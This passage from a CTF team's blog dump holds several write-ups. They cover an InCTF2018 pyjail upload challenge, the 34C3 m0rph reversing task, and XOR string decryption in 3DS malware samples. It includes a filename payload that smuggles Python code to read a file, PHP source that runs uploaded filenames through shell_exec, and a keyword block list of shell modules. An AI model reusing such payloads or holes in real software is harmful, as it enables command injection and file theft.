globals().values()[0].__dict__['b3Blbg=='.decode('base64')]('flag','r').read()#.jpg And there it was the flag, and I managed to get the source code of the php file so here is an extra: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960&lt;?php$target_dir = \"uploads/\";$target_file = $target_dir . basename($_FILES[\"fileToUpload\"][\"name\"]);$uploadOk = 1;$imageFileType = strtolower(pathinfo($target_file,PATHINFO_EXTENSION));$blacklist = \"import|os|class|subclasses|mro|request|args|eval|if|for|\\%|subprocess|file|open|popen|builtins|\\+|compile|execfile|from_pyfile|config|local|\\`|\\||\\&amp;|\\;|\\&#123;|\\&#125;\";if(!$_FILES[\"fileToUpload\"][\"name\"])&#123; die(\"PLEASE UPLOAD SOMETHING\");&#125;// Check if image file is a actual image or fake imageif(isset($_POST[\"submit\"])) &#123; $check = getimagesize($_FILES[\"fileToUpload\"][\"tmp_name\"]); if($check !== false) &#123; echo \"File is an image - \" . $check[\"mime\"] . \"&lt;br--&gt;\"; $uploadOk = 1; &#125; else &#123; echo \"File is not an image.\" . \"&lt;br&gt;\"; $uploadOk = 0; &#125;&#125;// Check file sizeif ($_FILES[\"fileToUpload\"][\"size\"] &gt; 500000) &#123; echo \"Sorry, your file is too large.\" . \"&lt;br&gt;\"; $uploadOk = 0;&#125;// Allow certain file formatsif($imageFileType != \"jpg\" &amp;&amp; $imageFileType &amp;&amp; \"png\" &amp;&amp; $imageFileType != \"jpeg\"&amp;&amp; $imageFileType != \"gif\" ) &#123; echo \"Sorry, only JPG, JPEG, PNG &amp; GIF files are allowed.\" . \"&lt;br&gt;\"; $uploadOk = 0;&#125;// Check if $uploadOk is set to 0 by an errorif ($uploadOk == 0) &#123; echo \"Sorry, your file was not uploaded.\" . \"&lt;br&gt;\"; exit();&#125;// if everything is ok, try to upload fileif (preg_match(\"/$blacklist/i\", $_FILES[\"fileToUpload\"][\"name\"]))&#123; echo \"&lt;br&gt;Filename: \".$_FILES[\"fileToUpload\"][\"name\"].\"&lt;br&gt;&lt;br&gt;\"; die(\"I think its called blacklisting...!\");&#125;echo \"The file: \". basename( $_FILES[\"fileToUpload\"][\"name\"]). \" has been uploaded.\" . \"&lt;br&gt;\";echo \"File: \" . $_FILES[\"fileToUpload\"][\"name\"] . \"&lt;br&gt;\";echo \"Size: \" . $_FILES[\"fileToUpload\"][\"size\"] . \"&lt;br&gt;\";echo \"Type: \" . $_FILES[\"fileToUpload\"][\"type\"] . \"&lt;br&gt;\";echo \"&lt;br&gt;&lt;br&gt;&lt;br&gt;\";echo $name = urldecode($_FILES[\"fileToUpload\"][\"name\"]);echo \"&lt;br&gt;&lt;br&gt;&lt;br&gt;\";echo shell_exec(\"python -c \\\"\" . $name . \"\\\" 2&gt;&amp;1\");?&gt;","categories":[{"name":"Web","slug":"Web","permalink":"https://teamrocketist.github.io/categories/Web/"}],"tags":[{"name":"InCTF2018","slug":"InCTF2018","permalink":"https://teamrocketist.github.io/tags/InCTF2018/"},{"name":"web","slug":"web","permalink":"https://teamrocketist.github.io/tags/web/"},{"name":"pyjail","slug":"pyjail","permalink":"https://teamrocketist.github.io/tags/pyjail/"},{"name":"python_sandbox","slug":"python-sandbox","permalink":"https://teamrocketist.github.io/tags/python-sandbox/"}]},{"title":"[Reverse] 34C3ctf - m0rph","slug":"Reverse-34C3ctf-m0rph","date":"2017-12-30T00:07:22.000Z","updated":"2018-10-24T23:21:04.870Z","comments":true,"path":"2017/12/30/Reverse-34C3ctf-m0rph/","link":"","permalink":"https://teamrocketist.github.io/2017/12/30/Reverse-34C3ctf-m0rph/","excerpt":"","text":"m0rph 49 Solves: 163To get you started :)files: Linkdifficulty: easy Opening the binary in IDA: As we can see mmap is being used to reserve a place in memory with read,write and execute permissions, by knowing this we can expect that some shellcode is going to be inserted in some place in the memory and then executed. The shellcode is being inserted in the final for loop that you can see in the image above, but in each run, this mini shellcodes are going to be executed in a different order because they are being randomized in sub_55C4675D7987. This isn’t a problem we can use radare2 to check this shellcode on each loop iteration, by reading the shellcode we can check which byte is being checked in cmp instructions. The commands I used in radare2 to this were the following: 12345678ood argv1 # starts the binary with argv1pdf @ main # disassembles the main functiondb # setting breakpointsdc # continuepd 4@rax # to disassemble the first 4 instructions before call raxdr # show register valuesdr rax # show a specific value of a register in this case raxdr rax = 0x1 # modifies the value of rax in this case to 0x1 Since pie protection is enabled the addresses to breakpoint will be different in each debug running attempt, to circumvent this in my python script I’m disassembling the main function and parsing the code to get this addresses. Since we don’t know the flag yet on each byte checks we can’t forget to update in the argv1 string the correct bytes otherwise (before cmp), if the check goes incorrect the shellcode will call syscall_exit and terminates. My radare2 script to do this (r2pipe): 123456789101112131415161718192021222324252627282930313233343536import r2pipeimport redef write_lowest_byte(n, b): return n &amp; 0xffffffffffffff00 | bflag_begin = '34C3_'flag = flag_begin + 'A'*(23-len(flag_begin))r2=r2pipe.open('./morph',flags=['-2'])r2.cmd(\"ood %s\" % flag)r2.cmd(\"aa\")source_main = r2.cmd(\"pdf @ main\")bp_lines = [line for line in source_main.split('\\n') if \"call rax\" in line]bps = [re.search(r'0x[0-9a-f]+', bp).group(0) for bp in bp_lines]for bp in bps: r2.cmd('db %s'%bp)r2.cmd(\"dc\")flag_bytes = []for i in range(23): code = r2.cmd(\"pd 4@rax\") line = code.split('\\n')[-1] finds = re.findall(r'0x[0-9a-f]+', line) cmp_b = finds[0] flag_byte = finds[1] t = (int(flag_byte,16), int(r2.cmd(\"dr rax\"), 16)) flag_bytes.append(t) r2.cmd(\"db %s\" % cmp_b) r2.cmd(\"dc\") address = int(r2.cmd(\"dr rax\"), 16) r2.cmd(\"dr rax = %s\" % hex(write_lowest_byte(address, int(flag_byte,16)))) r2.cmd(\"dc\")flag = ''flag_bytes = sorted(flag_bytes,key=lambda tup: tup[1])print ''.join([chr(t[0]) for t in flag_bytes])r2.quit() If you putted a breakpoint before the end, you could check the full shellcode with radare2 by using this: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142[0x55769853cb95]&gt; pd 140@ 0x7f3e3151b000 ;-- rcx: ;-- rsi: 0x7f3e3151b000 56 push rsi 0x7f3e3151b001 52 push rdx 0x7f3e3151b002 8a07 mov al, byte [rdi] 0x7f3e3151b004 3c33 cmp al, 0x33 ; &apos;3&apos; ; 51 ,=&lt; 0x7f3e3151b006 0f85db020000 jne 0x7f3e3151b2e7 ,==&lt; 0x7f3e3151b00c e9b8020000 jmp 0x7f3e3151b2c9 || 0x7f3e3151b011 56 push rsi || 0x7f3e3151b012 52 push rdx || 0x7f3e3151b013 8a07 mov al, byte [rdi] || 0x7f3e3151b015 3c34 cmp al, 0x34 ; &apos;4&apos; ; 52 ,===&lt; 0x7f3e3151b017 0f85ca020000 jne 0x7f3e3151b2e7 ,====&lt; 0x7f3e3151b01d e9a7020000 jmp 0x7f3e3151b2c9 |||| 0x7f3e3151b022 56 push rsi |||| 0x7f3e3151b023 52 push rdx |||| 0x7f3e3151b024 8a07 mov al, byte [rdi] |||| 0x7f3e3151b026 3c43 cmp al, 0x43 ; &apos;C&apos; ; 67 ,=====&lt; 0x7f3e3151b028 0f85b9020000 jne 0x7f3e3151b2e7 ,======&lt; 0x7f3e3151b02e e996020000 jmp 0x7f3e3151b2c9 |||||| 0x7f3e3151b033 56 push rsi |||||| 0x7f3e3151b034 52 push rdx |||||| 0x7f3e3151b035 8a07 mov al, byte [rdi] |||||| 0x7f3e3151b037 3c33 cmp al, 0x33 ; &apos;3&apos; ; 51 ,=======&lt; 0x7f3e3151b039 0f85a8020000 jne 0x7f3e3151b2e7 ========&lt; 0x7f3e3151b03f e985020000 jmp 0x7f3e3151b2c9 ||||||| 0x7f3e3151b044 56 push rsi ||||||| 0x7f3e3151b045 52 push rdx ||||||| 0x7f3e3151b046 8a07 mov al, byte [rdi] ||||||| 0x7f3e3151b048 3c5f cmp al, 0x5f ; &apos;_&apos; ; 95 ========&lt; 0x7f3e3151b04a 0f8597020000 jne 0x7f3e3151b2e7 ========&lt; 0x7f3e3151b050 e974020000 jmp 0x7f3e3151b2c9 ||||||| 0x7f3e3151b055 56 push rsi ||||||| 0x7f3e3151b056 52 push rdx ||||||| 0x7f3e3151b057 8a07 mov al, byte [rdi] ||||||| 0x7f3e3151b059 3c4d cmp al, 0x4d ; &apos;M&apos; ; 77 ========&lt; 0x7f3e3151b05b 0f8586020000 jne 0x7f3e3151b2e7 ========&lt; 0x7f3e3151b061 e963020000 jmp 0x7f3e3151b2c9 ||||||| 0x7f3e3151b066 56 push rsi ||||||| 0x7f3e3151b067 52 push rdx ||||||| 0x7f3e3151b068 8a07 mov al, byte [rdi] ||||||| 0x7f3e3151b06a 3c31 cmp al, 0x31 ; &apos;1&apos; ; 49 ========&lt; 0x7f3e3151b06c 0f8575020000 jne 0x7f3e3151b2e7 ========&lt; 0x7f3e3151b072 e952020000 jmp 0x7f3e3151b2c9 ||||||| 0x7f3e3151b077 56 push rsi ||||||| 0x7f3e3151b078 52 push rdx ||||||| 0x7f3e3151b079 8a07 mov al, byte [rdi] ||||||| 0x7f3e3151b07b 3c47 cmp al, 0x47 ; &apos;G&apos; ; 71 ========&lt; 0x7f3e3151b07d 0f8564020000 jne 0x7f3e3151b2e7 ========&lt; 0x7f3e3151b083 e941020000 jmp 0x7f3e3151b2c9 ||||||| 0x7f3e3151b088 56 push rsi ||||||| 0x7f3e3151b089 52 push rdx ||||||| 0x7f3e3151b08a 8a07 mov al, byte [rdi] ||||||| 0x7f3e3151b08c 3c48 cmp al, 0x48 ; &apos;H&apos; ; 72 ========&lt; 0x7f3e3151b08e 0f8553020000 jne 0x7f3e3151b2e7 ========&lt; 0x7f3e3151b094 e930020000 jmp 0x7f3e3151b2c9 ||||||| 0x7f3e3151b099 56 push rsi ||||||| 0x7f3e3151b09a 52 push rdx ||||||| 0x7f3e3151b09b 8a07 mov al, byte [rdi] ||||||| 0x7f3e3151b09d 3c54 cmp al, 0x54 ; &apos;T&apos; ; 84 ========&lt; 0x7f3e3151b09f 0f8542020000 jne 0x7f3e3151b2e7 ========&lt; 0x7f3e3151b0a5 e91f020000 jmp 0x7f3e3151b2c9 ||||||| 0x7f3e3151b0aa 56 push rsi ||||||| 0x7f3e3151b0ab 52 push rdx ||||||| 0x7f3e3151b0ac 8a07 mov al, byte [rdi] ||||||| 0x7f3e3151b0ae 3c59 cmp al, 0x59 ; &apos;Y&apos; ; 89 ========&lt; 0x7f3e3151b0b0 0f8531020000 jne 0x7f3e3151b2e7 ========&lt; 0x7f3e3151b0b6 e90e020000 jmp 0x7f3e3151b2c9 ||||||| 0x7f3e3151b0bb 56 push rsi ||||||| 0x7f3e3151b0bc 52 push rdx ||||||| 0x7f3e3151b0bd 8a07 mov al, byte [rdi] ||||||| 0x7f3e3151b0bf 3c5f cmp al, 0x5f ; &apos;_&apos; ; 95 ========&lt; 0x7f3e3151b0c1 0f8520020000 jne 0x7f3e3151b2e7 ========&lt; 0x7f3e3151b0c7 e9fd010000 jmp 0x7f3e3151b2c9 ||||||| 0x7f3e3151b0cc 56 push rsi ||||||| 0x7f3e3151b0cd 52 push rdx ||||||| 0x7f3e3151b0ce 8a07 mov al, byte [rdi] ||||||| 0x7f3e3151b0d0 3c4d cmp al, 0x4d ; &apos;M&apos; ; 77 ========&lt; 0x7f3e3151b0d2 0f850f020000 jne 0x7f3e3151b2e7 ========&lt; 0x7f3e3151b0d8 e9ec010000 jmp 0x7f3e3151b2c9 ||||||| 0x7f3e3151b0dd 56 push rsi ||||||| 0x7f3e3151b0de 52 push rdx ||||||| 0x7f3e3151b0df 8a07 mov al, byte [rdi] ||||||| 0x7f3e3151b0e1 3c30 cmp al, 0x30 ; &apos;0&apos; ; 48 ========&lt; 0x7f3e3151b0e3 0f85fe010000 jne 0x7f3e3151b2e7 ========&lt; 0x7f3e3151b0e9 e9db010000 jmp 0x7f3e3151b2c9 ||||||| 0x7f3e3151b0ee 56 push rsi ||||||| 0x7f3e3151b0ef 52 push rdx ||||||| 0x7f3e3151b0f0 8a07 mov al, byte [rdi] ||||||| 0x7f3e3151b0f2 3c52 cmp al, 0x52 ; &apos;R&apos; ; 82 ========&lt; 0x7f3e3151b0f4 0f85ed010000 jne 0x7f3e3151b2e7 ========&lt; 0x7f3e3151b0fa e9ca010000 jmp 0x7f3e3151b2c9 ||||||| 0x7f3e3151b0ff 56 push rsi ||||||| 0x7f3e3151b100 52 push rdx ||||||| 0x7f3e3151b101 8a07 mov al, byte [rdi] ||||||| 0x7f3e3151b103 3c50 cmp al, 0x50 ; &apos;P&apos; ; 80 ========&lt; 0x7f3e3151b105 0f85dc010000 jne 0x7f3e3151b2e7 ========&lt; 0x7f3e3151b10b e9b9010000 jmp 0x7f3e3151b2c9 ||||||| 0x7f3e3151b110 56 push rsi ||||||| 0x7f3e3151b111 52 push rdx ||||||| 0x7f3e3151b112 8a07 mov al, byte [rdi] ||||||| 0x7f3e3151b114 3c68 cmp al, 0x68 ; &apos;h&apos; ; 104 ========&lt; 0x7f3e3151b116 0f85cb010000 jne 0x7f3e3151b2e7 ========&lt; 0x7f3e3151b11c e9a8010000 jmp 0x7f3e3151b2c9 ||||||| 0x7f3e3151b121 56 push rsi ||||||| 0x7f3e3151b122 52 push rdx ||||||| 0x7f3e3151b123 8a07 mov al, byte [rdi] ||||||| 0x7f3e3151b125 3c31 cmp al, 0x31 ; &apos;1&apos; ; 49 ========&lt; 0x7f3e3151b127 0f85ba010000 jne 0x7f3e3151b2e7 ========&lt; 0x7f3e3151b12d e997010000 jmp 0x7f3e3151b2c9 ||||||| ;-- rax: ||||||| 0x7f3e3151b132 56 push rsi ||||||| 0x7f3e3151b133 52 push rdx ||||||| 0x7f3e3151b134 8a07 mov al, byte [rdi] ||||||| 0x7f3e3151b136 3c6e cmp al, 0x6e ; &apos;n&apos; ; 110 ========&lt; 0x7f3e3151b138 0f85a9010000 jne 0x7f3e3151b2e7 ========&lt; 0x7f3e3151b13e e986010000 jmp 0x7f3e3151b2c9 ||||||| 0x7f3e3151b143 56 push rsi ||||||| 0x7f3e3151b144 52 push rdx ||||||| 0x7f3e3151b145 8a07 mov al, byte [rdi] ||||||| 0x7f3e3151b147 3c47 cmp al, 0x47 ; &apos;G&apos; ; 71 ========&lt; 0x7f3e3151b149 0f8598010000 jne 0x7f3e3151b2e7 ========&lt; 0x7f3e3151b14f e975010000 jmp 0x7f3e3151b2c9 ||||||| 0x7f3e3151b154 56 push rsi ||||||| 0x7f3e3151b155 52 push rdx ||||||| 0x7f3e3151b156 8a07 mov al, byte [rdi] ||||||| 0x7f3e3151b158 3c5f cmp al, 0x5f ; &apos;_&apos; ; 95 ========&lt; 0x7f3e3151b15a 0f8587010000 jne 0x7f3e3151b2e7 ========&lt; 0x7f3e3151b160 e964010000 jmp 0x7f3e3151b2c9 ||||||| 0x7f3e3151b165 56 push rsi ||||||| 0x7f3e3151b166 52 push rdx ||||||| 0x7f3e3151b167 8a07 mov al, byte [rdi] ||||||| 0x7f3e3151b169 3c67 cmp al, 0x67 ; &apos;g&apos; ; 103 ========&lt; 0x7f3e3151b16b 0f8576010000 jne 0x7f3e3151b2e7 ========&lt; 0x7f3e3151b171 e953010000 jmp 0x7f3e3151b2c9 ||||||| 0x7f3e3151b176 56 push rsi ||||||| 0x7f3e3151b177 52 push rdx ||||||| 0x7f3e3151b178 8a07 mov al, byte [rdi] ||||||| 0x7f3e3151b17a 3c30 cmp al, 0x30 ; &apos;0&apos; ; 48 ========&lt; 0x7f3e3151b17c 0f8565010000 jne 0x7f3e3151b2e7 ========&lt; 0x7f3e3151b182 e942010000 jmp 0x7f3e3151b2c9 As you can you can see you can already check the flag and all comparisons that were being made, in my python script I was saving the addresses where each mini shellcode starts, so I could sort the byte order to get the right flag in the end: 12$ python morph.py34C3_M1GHTY_M0RPh1nG_g0","categories":[{"name":"Reverse","slug":"Reverse","permalink":"https://teamrocketist.github.io/categories/Reverse/"}],"tags":[{"name":"shellcode","slug":"shellcode","permalink":"https://teamrocketist.github.io/tags/shellcode/"},{"name":"reverse","slug":"reverse","permalink":"https://teamrocketist.github.io/tags/reverse/"},{"name":"radare2","slug":"radare2","permalink":"https://teamrocketist.github.io/tags/radare2/"},{"name":"radare2_script","slug":"radare2-script","permalink":"https://teamrocketist.github.io/tags/radare2-script/"},{"name":"mmap","slug":"mmap","permalink":"https://teamrocketist.github.io/tags/mmap/"},{"name":"34C3ctf2017","slug":"34C3ctf2017","permalink":"https://teamrocketist.github.io/tags/34C3ctf2017/"}]},{"title":"[Reverse] 3DS - IRC Bot Takeover","slug":"Reverse-3DS-IRC-Bot-Takeover","date":"2017-12-19T22:09:52.000Z","updated":"2018-10-24T23:21:04.866Z","comments":true,"path":"2017/12/19/Reverse-3DS-IRC-Bot-Takeover/","link":"","permalink":"https://teamrocketist.github.io/2017/12/19/Reverse-3DS-IRC-Bot-Takeover/","excerpt":"","text":"IRC Bot Takeover - 486 PointsWARNING! DON’T EXECUTE THIS SAMPLE IN YOUR OWN PERSONAL MACHINE!!!Update: We had some problems with a specific step of the challenge (still possible to solve, but more hard) and we updated the binary. The new file has the old version, but you only need the new to solve. This malware was about controlling a bot net via IRC, we were allowed to access it since the url and port were bot present in the binary, but we didn’t really needed to access it to solve this, unless you infected a machine of yours to debug it to understand better how the malware works(some people actually did this I saw some bots from other players in a channel in IRC we actually could control them lol). This challenge as in Ransomware and w32.killah is once again to decrypt obfuscated strings, but this time they are encrypting the string two times: There were two executables, one of them was useless the one that has the encrypted flag was bot.exe. The code above is present at the sub-routine sub_4012E1 if you use IDA open the binary (bot.exe executable). Once again the xor_encryption2 is exactly like w32.killah, I had to brute force the key once again, but this time since they are encrypting twice I need to brute force two keys instead of one: 12345678910111213141516171819202122232425262728import structimport stringdef xor_encrytion(al, ecx, edx): c = '' for i in range(ecx): n = chr((((ord(edx[i]) + ord(al))%256) ^ ord(al)) %256) s = chr(ord(edx[i]) ^ ord(al)) #print n,s if s in string.printable: c += s else: c += n #print c return cfor j in range(1,0xff): for i in range(1,0xff): e = xor_encrytion(al=chr(i), ecx=0x10-1, edx='%&lt;EmqhiYUi0deY\\\\') h = xor_encrytion(al=chr(j), ecx=0x10-1, edx=e) print h, i, jfor j in range(1,0xff): for i in range(1,0xff): e = xor_encrytion(al=chr(i), ecx=0x12-1, edx='mckW,sSWisWdak3!u') h = xor_encrytion(al=chr(j), ecx=0x12-1, edx=e) print h, i, j The first part of the flag:12345678$ python ircbot.py | grep '3DS&#123;'3DS&#123;wpwgcw8lsgd 139 83DS&#123;who_#o0ls_d 229 983DS&#123;who_#o0ls_d 228 993DS&#123;who_#o0ls_d 230 993DS&#123;who_co0ls_d 133 1303DS&#123;who_co0ls_d 132 1313DS&#123;who_co0ls_d 134 131 The rest: 1234567891011121314$ python ircbot.py | grep '&#125;\\s'......uck_4sS_is_lak3!&#125; 224 100uow[4^?_[i^?[law?!&#125; 226 100Ec&#123;_^DsS_ys_la&#123;3!&#125; 232 100EoGk^D^?_ky^?klaG?!&#125; 234 100komQ*^?UQo^?Qlam5'&#125; 96 102ukoS(&#123;WSm&#123;Slao7%&#125; 98 102EmGY\"^?]Yy^?YjoG=/&#125; 104 102EoC[ &#123;_[y&#123;[lmC?-&#125; 106 102uow[4^?_[i^?[law?!&#125; 224 102...... A simple script to join the parts of the flag since we now know the keys: 1234567891011121314151617181920212223242526272829303132333435import structimport stringdef xor_encrytion(al, ecx, edx): c = '' for i in range(ecx): n = chr((((ord(edx[i]) + ord(al))%256) ^ ord(al)) %256) s = chr(ord(edx[i]) ^ ord(al)) #print n,s if s in string.printable: c += s else: c += n #print c return cdef sub_4005D0(al, ecx, edx): c = '' for i in range(ecx): c += chr(ord(edx[i]) ^ ord(al)) return ca = sub_4005D0(al='\\x12',ecx=7-1, edx='1`scg&#123;')b = sub_4005D0(al='\\x12',ecx=0x11-1, edx='&#123;`q&lt;t`ww|&#125;vw&lt;|wf')c = sub_4005D0(al='\\x12',ecx=0xa-1, edx='s``&#125;\\x7f\\x70\\x73\\x76\\x7d')d = sub_4005D0(al='\\x12',ecx=0x8-1, edx='qsfgsps')f = xor_encrytion(al='\\x85', ecx=0x10-1, edx='%&lt;EmqhiYUi0deY\\\\')g = xor_encrytion(al='\\x82', ecx=0x10-1, edx=f)h = xor_encrytion(al='\\xe4', ecx=0x12-1, edx='mckW,sSWisWdak3!u')i = xor_encrytion(al='\\xc0', ecx=0x12-1, edx=h)print a,b,c,dprint g+i Running it 123$ python ircbot.py#raqui irc.freenode.net arrombado catuaba3DS&#123;who_co0ls_duck_4sS_is_lak3!&#125; The flag was 3DS{who_co0ls_duck_4sS_is_lak3!}, note that the first line is other obfuscated strings you could decrypt to help you understand the control flow of the binary.","categories":[{"name":"Reverse","slug":"Reverse","permalink":"https://teamrocketist.github.io/categories/Reverse/"}],"tags":[{"name":"xor","slug":"xor","permalink":"https://teamrocketist.github.io/tags/xor/"},{"name":"reverse","slug":"reverse","permalink":"https://teamrocketist.github.io/tags/reverse/"},{"name":"malware","slug":"malware","permalink":"https://teamrocketist.github.io/tags/malware/"},{"name":"3DS2017","slug":"3DS2017","permalink":"https://teamrocketist.github.io/tags/3DS2017/"}]},{"title":"[Reverse] 3DS - W32.killah","slug":"Reverse-3DS-W32-killah","date":"2017-12-19T21:15:19.000Z","updated":"2018-10-24T23:21:04.866Z","comments":true,"path":"2017/12/19/Reverse-3DS-W32-killah/","link":"","permalink":"https://teamrocketist.github.io/2017/12/19/Reverse-3DS-W32-killah/","excerpt":"","text":"W32.killah - 487 PointsCaution.. “The flag is over there..”Password: “infected!”WARNING! DON’T EXECUTE THIS SAMPLE IN YOUR OWN PERSONAL MACHINE!!! Another malware problem, all malware problems were practically the same the writer of this challenge should have at least make it different from the others, as in Ransomware we have to decrypt more obfuscated strings but this time the encryption function is more difficult to understand, it does a summation before a xor, and uses 8 bit based operations (8 bit registers), we can see the beginning of start function we are actually decrypting a string: As I explained previously in Ransomware ecx is storing the string length, al is the single byte used to encrypt the string and edx is where is stored the encrypted string. Analysing the encryption function sub_4011A9, we can see it doesn’t only uses xor but it uses an addition operation before that: We know that a character must be between 0 to 255, the additions will break this range, I’m not so sure about this but I think in assembly when there is an 8 bit operation if an overflow occurs, it returns back to 0 and that’s what I tried to write in python : 1234567891011121314151617import structdef xor_encrytion(al, ecx, edx): c = '' for i in range(ecx): n = chr((((ord(edx[i]) + ord(al))%256) ^ ord(al)) %256) s = chr(ord(edx[i]) ^ ord(al)) #print n,s if s in string.printable: c += s else: c += n #print c return cbuf = struct.pack (\"17B\", *[0xC6,0xb4,0xc6,0xca,0xf2,0xe3,0xe9,0xf3,0xf9,0xfb,0xf6,0xde,0xe8,0xf3,0xec,0xff,0xaa]) Well this actually worked for the first encrypted string: 12$ python w32killah.py3DS&#123;m4lw@r3_1 And we got the first part of the flag… while searching in IDA I didn’t initially found the other encryption code until I started searching and found some code that wasn’t present in the function window: Once again we need to decrypt that string but this time the function I wrote in python didn’t really work, outputed me a bunch of non printable characters, so I may misunderstood how actually 8 bit operations work in assembly, but I still managed to solve this by trying a bunch of other key bytes: 1234567891011121314151617181920import structimport stringdef xor_encrytion(al, ecx, edx): c = '' for i in range(ecx): n = chr((((ord(edx[i]) + ord(al))%256) ^ ord(al)) %256) s = chr(ord(edx[i]) ^ ord(al)) #print n,s if s in string.printable: c += s else: c += n #print c return cfor i in range(1,0xff): print xor_encrytion(al=chr(i),ecx=0x10-1,edx=struct.pack (\"15B\", *[ 0xb3,0xdf,0xa6,0xb5,0xa3,0xcb,0xa9,0xae,0xc7,0xdf,0xa6, 0xb5,0xae,0xe1,0xbd])), i A there we go the key to decrypt the flag with the function I wrote was 96 in hex is 0x60:12345678910111213141516171819202122$ python w32.killah.py | grep '&#125;'s_fucKinG_fun!&#125; 96w#jugOirK#jur!&#125; 98s'n&#125;cKivO'n&#125;v!E 100&#125;!nmUkvI!nv#G 101#j&#125;oWirK#j&#125;r!E 102&#125;!j&#123;mUwrI!j&#123;r/C 103M!~O&#125;U&#123;vY!~Ov#G 109M!zK&#125;UwrY!zKr?C 111/C:)?W52[C:)2&#125;! 156s_fuc inG_fun!&#125; 192&#123;on&#125;k[afGon&#125;f)u 200&#125;ch&#123;mWg` ch&#123;`/s 206` ufpMz&#125;I uf&#125;2n 211g rawK&#125;zO raz5i 212ha&#125;nx&#125;ruya&#125;nu:f 219mcxk&#125;wwp&#123;cxkp?c 222 The flag was 3DS{m4lw@r3_1s_fucKinG_fun!}","categories":[{"name":"Reverse","slug":"Reverse","permalink":"https://teamrocketist.github.io/categories/Reverse/"}],"tags":[{"name":"xor","slug":"xor","permalink":"https://teamrocketist.github.io/tags/xor/"},{"name":"reverse","slug":"reverse","permalink":"https://teamrocketist.github.io/tags/reverse/"},{"name":"malware","slug":"malware","permalink":"https://teamrocketist.github.io/tags/malware/"},{"name":"3DS2017","slug":"3DS2017","permalink":"https://teamrocketist.github.io/tags/3DS2017/"}]},{"title":"[Reverse] 3DS - Ransomware","slug":"Reverse-3DS-Ransomware","date":"2017-12-18T19:45:33.000Z","updated":"2018-10-24T23:21:04.862Z","comments":true,"path":"2017/12/18/Reverse-3DS-Ransomware/","link":"","permalink":"https://teamrocketist.github.io/2017/12/18/Reverse-3DS-Ransomware/","excerpt":"","text":"Ransomware - 464 PointsWARNING! DON’T EXECUTE THIS SAMPLE IN YOUR OWN PERSONAL MACHINE!!! We have a malware to analyse, right at the beginning(_start function) I found an encrypted string with xor, reversing it wasn’t very hard as you can see bellow: The actual function in the ida was this one: Rewriting this function into python we ended up with this: 123456789101112import structdef sub_4005D0(al, ecx, edx): c = '' for i in range(ecx): c += chr(ord(edx[i]) ^ ord(al)) return cfirst = struct.pack (\"16B\", *[0xea,0xe8,0xe4,0xe8,0xef,0xdb,0xe1,0xeb,0xe6,0xe0,0xa9,0xea,0xe8,0xe4,0xe8,0xef])print sub_4005D0(al='\\x87',ecx=0x11-1, edx=first) By running the script we can see that the encrypted string was the name of the file we received from the challenge which was encrypted: 12$ python writeup_mocoh.py mocoh\\flag.moco One good thing to do while reversing is to rename the function and string names to a more readable names, so if they are reused we can immediately recognize them : Now continuing analysing the contents of sub_40023B we have more strings to decrypt: Updating this python script with this: 123456789101112131415161718192021222324import structdef sub_4005D0(al, ecx, edx): c = '' for i in range(ecx): c += chr(ord(edx[i]) ^ ord(al)) return cfirst = struct.pack (\"16B\", *[0xea,0xe8,0xe4,0xe8,0xef,0xdb,0xe1,0xeb,0xe6,0xe0,0xa9,0xea,0xe8,0xe4,0xe8,0xef])print sub_4005D0(al='\\x87',ecx=0x11-1, edx=first)a = sub_4005D0(al='\\x54',ecx=9-1, edx=struct.pack (\"8B\", *[0x27,0x31,0x21,0x26,0x21,0x36,0x21,0x37]))b = sub_4005D0(al='\\x80',ecx=9-1, edx=struct.pack (\"8B\", *[0xe1,0xee,0xf4,0xe1,0xf3,0xf3,0xe5,0xe5]))c = sub_4005D0(al='\\x14',ecx=9-1, edx=struct.pack (\"8B\", *[0x61,0x77,0x7b,0x78,0x7b,0x77,0x75,0x62]))d = sub_4005D0(al='\\x32',ecx=0xa-1, edx=struct.pack (\"9B\", *[0x53,0x5c,0x53,0x55,0x53,0x5b,0x5d,0x5e,0x53]))print aprint bprint cprint d By running we can see it’s some words in Portuguese and they don’t look really useful at all: 1234567$ python mocoh.pymocoh\\flag.mocohmocoh\\flag.mocohseurubucantasseeucolocavanagaiola After renaming the variable names in IDA ended up in this final part of the program: As you can see above every string we decrypted is being concatenated into a place in memory at dword_4012c0, and at the end in sub_4005DA the flag file name is being pushed in to the stack since this will be a argument to that function so this may be the one that was used to encrypted the flag.mocoh file! Now by checking this function I found it too hard to reverse sub_400684, without running the malware itself (Couldn’t do it since it executable wasn’t compatible with my Windows 10 VM), so after failing to infect myself and debugging it with IDA, I checked that sub_4006D8 of them was using xor again to encrypt that file: Now you may be asking if I didn’t reverse sub_400684 how the hell I did get the keys to decrypt the flag file? well I wasn’t really expecting this to happen but at some point I knew I could know the first 4 bytes of the key because we know the first 4 bytes of the plaintext which is part of the flag format 3DS{, I wanted to check before reversing the rest, the first 4 bytes of the key, I did this by brute-forcing byte by byte: 1234567flag_cipher = open('flag.mocoh', 'r').read()plain = '3DS&#123;'for i in range(0x4): for x in xrange(1,0xff): if ord(plain[i]) == ord(flag_cipher[i]) ^ x: print x break And surprisingly to me the first 4 bytes of the keys was always 175 12345$ python test.py 175175175175 And then I asked myself what if the key is always the same? this couldn’t be a coincidence: 12345flag_cipher = open('flag.mocoh', 'r').read()flag = ''for i,c in enumerate(flag_cipher): flag += chr(ord(c) ^ 175)print flag Running it we could see that this was the case…12$ python test.py 3DS&#123;4sS3mbly_r0cks!!&#125; And in the end I realized that I lost a lot of time reversing the binary, we didn’t even needed to reverse anything, if we made a guess that it was xor we could just tried and check that it was using always the same 1 byte key to encrypt…","categories":[{"name":"Reverse","slug":"Reverse","permalink":"https://teamrocketist.github.io/categories/Reverse/"}],"tags":[{"name":"xor","slug":"xor","permalink":"https://teamrocketist.github.io/tags/xor/"},{"name":"reverse","slug":"reverse","permalink":"https://teamrocketist.github.io/tags/reverse/"},{"name":"malware","slug":"malware","permalink":"https://teamrocketist.github.io/tags/malware/"},{"name":"3DS2017","slug":"3DS2017","permalink":"https://teamrocketist.github.io/tags/3DS2017/"},{"name":"ida","slug":"ida","permalink":"https://teamrocketist.github.io/tags/ida/"}]},{"title":"[Reverse] 3DS - Scared 